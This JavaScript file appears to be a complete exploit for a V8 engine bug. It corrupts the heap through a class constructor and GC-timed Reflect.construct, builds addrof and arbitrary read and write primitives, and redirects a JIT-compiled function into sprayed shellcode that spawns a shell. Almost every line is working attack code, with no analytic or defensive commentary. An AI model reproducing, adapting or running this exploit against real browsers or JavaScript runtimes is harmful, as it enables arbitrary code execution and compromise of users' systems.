let dogc_flag = false;

function foo() {
    return [
        1.0,
        1.95538254221075331056310651818E-246,
        1.95606125582421466942709801013E-246,
        1.99957147195425773436923756715E-246,
        1.95337673326740932133292175341E-246,
        2.63486047652296056448306022844E-284];
}
for (let i = 0; i < 0x100000; i++) {
    foo(); foo(); foo(); foo(); foo(); foo(); foo(); foo(); foo(); foo();
}

var arr_buf = new ArrayBuffer(8);
var arr_buf2 = new ArrayBuffer(8);
var f64_arr = new Float64Array(arr_buf);
var b64_arr = new BigInt64Array(arr_buf);
let u32_arr = new Uint32Array(arr_buf);
function ftoi(f) {
    f64_arr[0] = f;
    return b64_arr[0];
}
function itof(i) {
    b64_arr[0] = i;
    return f64_arr[0];
}
function smi(i) {
    return i << 1n;
}
function hex(i) {
    return "0x"+i.toString(16);
}

function gc_minor() {
    for (let i = 0; i < 0x100; i++) {
        new ArrayBuffer(0x10000);
    }
}

function gc() {
    if (dogc_flag) {
        gc_minor();
    }
}

function js_heap_defragment() {
    for (let i = 0; i < 0x1000; i++) new ArrayBuffer(0x10);
    for (let i = 0; i < 0x1000; i++) new Uint32Array(1);
}

let empty_object = {}
let empty_array = []
let corrupted_instance = null;

class ClassParent { }
class ClassBug extends ClassParent {
    constructor() {
        const v24 = new new.target();
        let x = [
            empty_object, empty_object, empty_object, empty_object, 
            empty_object, empty_object, empty_object, empty_object, 
            empty_object, empty_object, empty_object, 
        ];
        super();
        let a = [
            13.37
        ];
        // super();
        this.x = x;
        this.a = a;
        JSON.stringify(empty_array);
    }
    [1] = gc();
}

for (let i = 0; i < 200; i++) {
    dogc_flag = false;
    if (i % 2 == 0) dogc_flag = true;
    gc();
}

for (let i = 0; i < 650; i++) {

    dogc_flag = false;
    if (i == 644 || i == 645 || i == 646 || i == 640) {
        dogc_flag = true;
        gc();
        dogc_flag = false;
    }
    if (i == 646) dogc_flag = true;

    let x = Reflect.construct(ClassBug, empty_array, ClassParent);
    if (i == 646) corrupted_instance = x;
}

// dogc_flag = true;
// gc();
// js_heap_defragment();

function addrof(obj) {
    corrupted_instance.x[5] = obj;
    f64_arr[0] = corrupted_instance.a[0];
    let r = u32_arr[0] & 0xffffffff;
    return r;
}

// console.log("[*] test addrof address: "+hex(addrof_tmp(empty_object)));

// set fake length
corrupted_instance.x[10] = 0x10000;
console.log("[*] a.length: "+corrupted_instance.a.length);
if (corrupted_instance.a.length != 0x10000) {
    console.log("[*] failed to set a.length");
    exit();
}
// %DebugPrint(empty_object);
// %DebugPrint(corrupted_instance.a);
// %DebugPrint(corrupted_instance.x);

// test
// f64_arr[0] = corrupted_instance.a[7];
// console.log("[*] test: "+hex(b64_arr[0]));
// %SystemBreak();

let target_arr = new Uint32Array(arr_buf);
target_arr[0] = 0x41414141;
target_arr[1] = 0x42424242;
target_arr[2] = 0x43434343;
target_arr[3] = 0x44444444;
// %DebugPrint(target_arr);
let addrof_target_arr = addrof(target_arr);
console.log("[*] target_arr address: "+hex(addrof_target_arr));
// corrupted_instance.a[0x8e0] = itof(0x4141414100000e91n);
// % DebugPrint(corrupted_instance.a);
// % DebugPrint(target_arr);

heap_lower32 = corrupted_instance.a[0x8ed];
heap_lower32 = ftoi(heap_lower32) & 0xffffffffn;
heap_higher32 = corrupted_instance.a[0x8ed];
heap_higher32 = ftoi(heap_higher32) >> 32n;
heap_addr = (heap_higher32 << 32n) | heap_lower32;
console.log("[*] heap address: "+hex(heap_addr));

function set_heap_addr(addr) {
    corrupted_instance.a[0x8ed] = itof(addr);
}

// set_heap_addr(heap_addr-0x7f640);

function heap_arb_read(addr) {
    set_heap_addr(addr);
    return BigInt(target_arr[0]) | (BigInt(target_arr[1]) << 32n);
}

// js_heap = heap_arb_read(heap_addr-0x81440n+0x4n);
// js_heap = BigInt(js_heap) << 32n;
// console.log("[*] js heap address: "+hex(js_heap));

js_heap_ptr = heap_arb_read(heap_addr+0x48n)
console.log("[*] js heap ptr: "+hex(js_heap_ptr));
js_heap = heap_arb_read(js_heap_ptr+0x0n);
console.log("[*] js heap address: "+hex(js_heap));

addrof_foo = addrof(foo);
console.log("[*] foo address: "+hex(addrof_foo));
// %DebugPrint(foo);
// %DebugPrint(corrupted_instance.a);
// %DebugPrint(target_arr);

var shellcode = [
    0x6e69622fb848686an,
    0xe7894850732f2f2fn,
    0x2434810101697268n,
    0x6a56f63101010101n,
    0x894856e601485e08n,
    0x050f583b6ad231e6n
];

function heap_arb_read32(addr) {
    return heap_arb_read(addr) & 0xffffffffn;
}
foo_code = heap_arb_read32(BigInt(addrof_foo)-1n+js_heap+0xcn);
foo_code = BigInt(foo_code) + js_heap - 0x1n;
console.log("[*] foo code address: "+hex(foo_code));
rwx_addr = heap_arb_read(foo_code+0x14n);
console.log("[*] rwx address: "+hex(rwx_addr));
jmp_addr = rwx_addr + 0x66n;

function arb_write_32(addr, value) {
    set_heap_addr(addr);
    target_arr[0] = value;
}

arb_write_32(foo_code + 0x14n, Number(jmp_addr & 0xffffffffn));
arb_write_32(foo_code + 0x18n, Number(jmp_addr >> 32n));

// target_arr[0] = 0x43434343;
// console.log("[*] heap_arb_read: "+hex(heap_arb_read(addrof_target_arr)));

// %SystemBreak();

foo();

